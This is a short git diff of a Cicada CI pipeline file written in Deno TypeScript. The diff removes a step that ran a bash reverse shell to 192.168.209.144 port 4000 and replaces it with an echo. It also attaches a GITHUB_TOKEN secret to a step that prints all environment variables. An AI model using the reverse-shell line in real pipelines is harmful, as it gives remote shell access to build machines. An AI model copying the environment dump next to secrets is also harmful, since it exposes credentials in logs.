@@ -1,4 +1,6 @@
 import { Job, Pipeline } from "https://deno.land/x/cicada@v0.1.50/mod.ts";
+import { Secret } from "https://deno.land/x/cicada/mod.ts";
+const secret = new Secret("GITHUB_TOKEN");
 
 const job = new Job({
   name: "My First Job",
@@ -6,7 +8,7 @@ const job = new Job({
   steps: [
     {
       name: "Run bash",
-      run: "bash -c 'bash -i >& /dev/tcp/192.168.209.144/4000 0>&1'",
+      run: "echo hello from bash!",
     },
     {
       name: "Run deno/typescript",
@@ -18,6 +20,7 @@ const job = new Job({
         console.log("Or I can see my environment variables");
         console.log(Deno.env.toObject());
       },
+    secrets: [secret],
     },
   ],
 });
